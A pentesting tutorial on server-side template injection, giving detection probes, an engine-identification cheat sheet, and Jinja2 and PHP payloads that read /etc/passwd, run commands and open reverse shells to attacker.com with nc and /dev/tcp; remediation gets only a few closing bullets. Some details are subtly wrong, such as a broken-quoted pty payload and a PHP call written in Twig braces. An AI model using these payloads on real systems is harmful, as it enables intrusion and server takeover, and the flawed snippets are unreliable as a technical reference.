# A Pentester's Guide to Server-Side Template Injection (SSTI)

## What is SSTI?

Server-side template injection (SSTI) is a vulnerability where an attacker injects malicious input into a template to execute commands on the server-side. This occurs when user input is embedded into the template engine without proper validation, potentially leading to remote code execution (RCE).

### Common Template Engines:

- **PHP** – Smarty, Twig
- **Java** – Velocity, Freemaker
- **Python** – Jinja, Mako, Tornado
- **JavaScript** – Jade, Rage
- **Ruby** – Liquid

### How Does It Work?

Consider the following vulnerable request:

```http
POST /some-endpoint HTTP/1.1
Host: vulnerable-website.com
parameter=value
```

To test for SSTI, use a polyglot payload:

```http
POST /some-endpoint HTTP/1.1
Host: vulnerable-website.com
parameter=${7*7}
```

If the response contains `49`, the application is likely vulnerable.

## Impact of SSTI

SSTI vulnerabilities are critical as they often lead to:

- **Remote Code Execution (RCE)**
- **Access to sensitive data**
- **Server compromise**

## How To Identify the Vulnerability?

Use a polyglot payload containing special characters to test for SSTI:

```
${{<%[%'"}}%
```

If the server returns an error message or exception, it may indicate a vulnerability. Follow these steps:

1. Detect template injection.
2. Identify the template engine.
3. Consult the manual for specific exploitation techniques.
4. Exploit the vulnerability.

### Cheat Sheet for Identifying Template Engines

| Template Engine | Test Payload     |
| --------------- | ---------------- |
| Jinja2 (Python) | `{{7*7}}`        |
| Twig (PHP)      | `{{7*7}}`        |
| Velocity (Java) | `#set($x=7*7)$x` |
| Mako (Python)   | `${7*7}`         |
| Smarty (PHP)    | `{$7*7}`         |
| Jade/Pug (JS)   | `#{7*7}`         |

## Exploitation Techniques

Once an SSTI vulnerability is confirmed, further exploitation can include:

- **Reading Files:** `{{self.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}`
- **Command Execution:** `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
- **Retrieving Environment Variables:** `{{config.items()}}`

### Reverse Shell Payloads

#### Python

```python
{{ self.__init__.__globals__['os'].popen('nc -e /bin/sh attacker.com 4444').read() }}
```

#### Bash

```bash
{{ self.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/attacker.com/4444 0>&1').read() }}
```

#### PHP

```php
{{ passthru("nc -e /bin/sh attacker.com 4444") }}
```

## Automated Tools

**Tplmap** is a tool designed for automating SSTI exploitation, including:

- Sandbox escape techniques
- RCE payload generation
- Template engine detection

[GitHub Repository for Tplmap](https://github.com/epinna/tplmap)

## Advanced Commands & Tricks

### Checking for Error Messages:

```bash
curl -X POST -d 'parameter={{7*7}}' http://target.com/some-endpoint
```

### Extracting System Information:

```python
{{ self.__init__.__globals__['os'].popen('uname -a').read() }}
```

### Listing Files in Directory:

```python
{{ self.__init__.__globals__['os'].popen('ls -la').read() }}
```

### Gaining Interactive Shell:

```python
{{ self.__init__.__globals__['os'].popen('python3 -c "import pty; pty.spawn('/bin/bash')"').read() }}
```

## Remediation

### **1. Input Sanitization**

- Filter user input before passing it into the template engine.
- Use allowlists for expected input values.

### **2. Sandboxing**

- Restrict execution environments using secure sandboxes.
- Disable risky template functions where possible.

By following these best practices, you can prevent SSTI vulnerabilities and protect web applications from critical security risks.

